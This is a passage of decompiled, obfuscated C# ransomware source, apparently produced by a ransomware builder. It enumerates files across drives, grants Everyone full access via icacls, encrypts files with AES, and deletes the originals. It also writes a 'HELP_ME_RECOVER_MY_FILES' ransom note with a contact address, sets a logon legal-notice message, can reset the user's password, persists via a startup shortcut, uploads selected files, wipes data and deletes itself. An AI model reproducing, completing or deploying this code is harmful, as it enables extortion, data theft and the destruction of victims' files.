			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00c8;
			}
			catch
			{
			}
			continue;
			IL_00c8:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(CmEnmHNMSUiP("UmFuc29tQnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("HELP_ME_RECOVER_MY_FILES") && !fileInfo.FullName.EndsWith(".crypted") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(JsDNBHoAusk))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(OnsCBQGisPpLuf) * 1024.0 * 1024.0 && nZYFUQJApkbjG == "YES")
						{
							list.Add(fileInfo.FullName);
						}
						else if (File.Exists(fileInfo.FullName) && nZYFUQJApkbjG == "NO")
						{
							list.Add(fileInfo.FullName);
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> rqMLyNIsVRH(string zmpSBPsGOCB)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(zmpSBPsGOCB);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains("programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(CmEnmHNMSUiP("UmFuc29tQnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("HELP_ME_RECOVER_MY_FILES") && !item.FullName.EndsWith(".crypted") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(OnsCBQGisPpLuf) * 1024.0 * 1024.0 && nZYFUQJApkbjG == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && nZYFUQJApkbjG == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(CmEnmHNMSUiP("UmFuc29tQnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("HELP_ME_RECOVER_MY_FILES") && !item3.FullName.EndsWith(".crypted") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(OnsCBQGisPpLuf) * 1024.0 * 1024.0 && nZYFUQJApkbjG == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && nZYFUQJApkbjG == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (PathTooLongException)
		{
		}
		catch
		{
		}
		return list;
	}

	public static string mSZHpMYIEf(string BqoCZsxmdgGb = "", string oqzPAqlCOojQ = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = BqoCZsxmdgGb,
				Arguments = oqzPAqlCOojQ,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		catch
		{
		}
		return result;
	}

	public static void jMIMNDWyknDuf(string hsmwfyrBDMH)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = hsmwfyrBDMH,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string NemcUhhwwbKUnQ(string gzsbaIeEhIBYsFI)
	{
		char[] array = gzsbaIeEhIBYsFI.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string CmEnmHNMSUiP(string zqmHLKiLRuiR)
	{
		byte[] bytes = Convert.FromBase64String(zqmHLKiLRuiR);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void wwEkeXgwKrsrlSe(string bpDMPhJluoWebfM = "", string sbORsKPnHgbL = "SW5mb3JtYXRpb24uLi4=", string DMQhAsWaJnummOF = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		bpDMPhJluoWebfM = NemcUhhwwbKUnQ("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(CmEnmHNMSUiP(bpDMPhJluoWebfM), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(CmEnmHNMSUiP("TGVnYWxOb3RpY2VDYXB0aW9u"), CmEnmHNMSUiP(sbORsKPnHgbL));
			registryKey.SetValue(CmEnmHNMSUiP("TGVnYWxOb3RpY2VUZXh0"), CmEnmHNMSUiP(DMQhAsWaJnummOF));
			registryKey.Close();
		}
	}

	public static void wmkgQqLZhqBQx()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (HrWBrEHpTDqRTC == "YES" && !string.IsNullOrEmpty(bWCOnomnhUUq) && !string.IsNullOrEmpty(OkqZNavXZrXk))
				{
					wwEkeXgwKrsrlSe("", bWCOnomnhUUq, OkqZNavXZrXk);
				}
				else
				{
					wwEkeXgwKrsrlSe();
				}
			}
		}
		catch
		{
		}
	}

	public static void QOYSuFqaozDpOS(string DWEPVUedptvA = "SW5mb3JtYXRpb24uLi4=", string gZVURlJFuSmZJDI = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(CmEnmHNMSUiP(DWEPVUedptvA));
		val.set_BalloonTipText(CmEnmHNMSUiP(gZVURlJFuSmZJDI));
		val.ShowBalloonTip(30000);
	}

	public static void NcXWEJlhWauf(string qmyPqApSsDpey)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		mSZHpMYIEf("net.exe", "user " + text + " " + qmyPqApSsDpey);
	}

	public static bool vffOZEquQBbSJm()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void XlOnxoNESE()
	{
		mSZHpMYIEf("cmd.exe", CmEnmHNMSUiP("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = CmEnmHNMSUiP("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static string WoZooFcrEZT(string GnptBhrwgxAhXm)
	{
		string text = Path.GetTempPath() + "\\HELP_ME_RECOVER_MY_FILES.txt";
		if (!File.Exists(text))
		{
			using StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.WriteLine(CmEnmHNMSUiP("DQoqKiogQVRURU5USU9OICoqKg0KWW91ciBGaWxlIExvY2tlZCBCeSAiTWlsaXRhcnkgQWxnb3JpdGhtIiBBbmQgV2lwZWQuIA0KRm9yIFJlY292ZXJ5IFlvdXIgRmlsZXMgQ29udGFjdCA6IGwxdTF0MUBzZWNtYWlsLnBybw=="));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(CmEnmHNMSUiP("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(GnptBhrwgxAhXm);
		}
		else
		{
			File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + GnptBhrwgxAhXm);
		}
		return text;
	}

	public static void OTFelyBZYMRk(string bWSFcNVJxkiYb, string mJrEqnfoWxA)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + bWSFcNVJxkiYb + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + mJrEqnfoWxA);
		streamWriter.WriteLine("IconIndex=0");
		string text = mJrEqnfoWxA.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void oMDFbddahqmh(string[] MrrFocQTxa, string[] VkyAwlNmYJV, string[] GGcttKgmjNv, string EyGxpqaAHkL, string sumBQPWMdWpo)
	{
		oBtwYOpAzqwja = Encoding.ASCII.GetBytes(EyGxpqaAHkL);
		if (MrrFocQTxa[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !xaqMLrcbfeQ.Contains(drives[i].Name))
					{
						xaqMLrcbfeQ.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < MrrFocQTxa.Length; i++)
			{
				if (!xaqMLrcbfeQ.Contains(MrrFocQTxa[i]))
				{
					xaqMLrcbfeQ.Add(MrrFocQTxa[i]);
				}
			}
		}
		if (xaqMLrcbfeQ.Contains(CmEnmHNMSUiP("Qzpc")) && uxoTDxRvaxB == "YES")
		{
			xaqMLrcbfeQ.Remove(CmEnmHNMSUiP("Qzpc"));
		}
		foreach (string YvyDOhLNzgZwekX in xaqMLrcbfeQ)
		{
			if (xGvocjwEhfU == "YES" && YvyDOhLNzgZwekX.EndsWith(":\\"))
			{
				mSZHpMYIEf(CmEnmHNMSUiP("aWNhY2xzLmV4ZQ=="), YvyDOhLNzgZwekX.Replace(":\\", ":\\*") + CmEnmHNMSUiP("IC9ncmFudCBFdmVyeW9uZTpGIC9UIC9DIC9R"));
			}
			else if (xGvocjwEhfU == "YES" && !YvyDOhLNzgZwekX.EndsWith(":\\") && YvyDOhLNzgZwekX.EndsWith("\\"))
			{
				mSZHpMYIEf(CmEnmHNMSUiP("aWNhY2xzLmV4ZQ=="), YvyDOhLNzgZwekX + "*" + CmEnmHNMSUiP("IC9ncmFudCBFdmVyeW9uZTpGIC9UIC9DIC9R"));
			}
			else if (xGvocjwEhfU == "YES" && !YvyDOhLNzgZwekX.EndsWith("\\"))
			{
				mSZHpMYIEf(CmEnmHNMSUiP("aWNhY2xzLmV4ZQ=="), YvyDOhLNzgZwekX + "\\*" + CmEnmHNMSUiP("IC9ncmFudCBFdmVyeW9uZTpGIC9UIC9DIC9R"));
			}
			if (ibaCbmLmbpX == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					UptglIayBKt(YvyDOhLNzgZwekX, VkyAwlNmYJV, sumBQPWMdWpo, GGcttKgmjNv, EyGxpqaAHkL);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				UptglIayBKt(YvyDOhLNzgZwekX, VkyAwlNmYJV, sumBQPWMdWpo, GGcttKgmjNv, EyGxpqaAHkL);
			}
		}
	}

	public static void UptglIayBKt(string HtkQGHIABJvO, string[] vsjEHYaVVJwn, string XfENHrorvz, string[] DXQKFBSIbVVrWciT, string YAINcCjwMYbkwD)
	{
		List<string> list = new List<string>();
		list = ((!(TYOdIhsVEc == "YES")) ? QyBLOmDQkbX.SearchFiles(HtkQGHIABJvO) : lQxqgeqEXFmgz(HtkQGHIABJvO));
		foreach (string value in vsjEHYaVVJwn)
		{
			foreach (string item in list)
			{
				if (DXQKFBSIbVVrWciT.Length != 0)
				{
					int num = 0;
					while (num < DXQKFBSIbVVrWciT.Length)
					{
						string value2 = DXQKFBSIbVVrWciT[num];
						if (!item.EndsWith(value2))
						{
							num++;
							continue;
						}
						goto IL_0154;
					}
				}
				if ((ttAmWytDSins == "NO" && !item.EndsWith(value)) || yONTCwwfkXlFhtU.Contains(item))
				{
					continue;
				}
				if (LsKJTnBRaR == "YES")
				{
					try
					{
						if (fdRUKddSCaQ.rjAYUyFVUzIWi(item))
						{
							fdRUKddSCaQ.bNVGHcAokXIJXe(item);
						}
					}
					catch
					{
					}
				}
				yONTCwwfkXlFhtU.Add(item);
				if (!yKUDxGEVObKrNk.Contains(Path.GetDirectoryName(item)))
				{
					yKUDxGEVObKrNk.Add(Path.GetDirectoryName(item));
				}
				try
				{
					if (XfENHrorvz != ".*")
					{
						QxHgXaQzDjk(item, item + XfENHrorvz, oBtwYOpAzqwja);
					}
					else
					{
						QxHgXaQzDjk(item, item + ".part", oBtwYOpAzqwja);
					}
				}
				catch (Exception)
				{
				}
				IL_0154:;
			}
		}
	}

	private static void QxHgXaQzDjk(string MAJlhrZgjn, string cBNgcSWpqUMrUU, byte[] MZnpuysaEyvgW)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(cBNgcSWpqUMrUU, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(MZnpuysaEyvgW, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(MAJlhrZgjn, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (cBNgcSWpqUMrUU.Length > 0)
				{
					FileStream fileStream3 = new FileStream(MAJlhrZgjn, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (usBTaskzfJ == "YES")
					{
						foreach (string item in EsdLifEKRrvz)
						{
							if (MAJlhrZgjn.ToLower().EndsWith(item) && pRTLpBFwdcGPRXJ == "YES")
							{
								if (Convert.ToInt32(qWxNlyprnnbj) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										IMqeXbiZFcK.meZppCccUJL("URL", "USERNAME", "ACCESO", MAJlhrZgjn);
									}
									catch
									{
									}
								}
							}
							else if (MAJlhrZgjn.ToLower().EndsWith(item) && pRTLpBFwdcGPRXJ == "NO")
							{
								try
								{
									IMqeXbiZFcK.meZppCccUJL("URL", "USERNAME", "ACCESO", MAJlhrZgjn);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(MAJlhrZgjn) && num2 >= 0)
							{
								File.Delete(MAJlhrZgjn);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (cBNgcSWpqUMrUU.EndsWith(".part"))
					{
						File.Move(cBNgcSWpqUMrUU, cBNgcSWpqUMrUU.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(cBNgcSWpqUMrUU);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
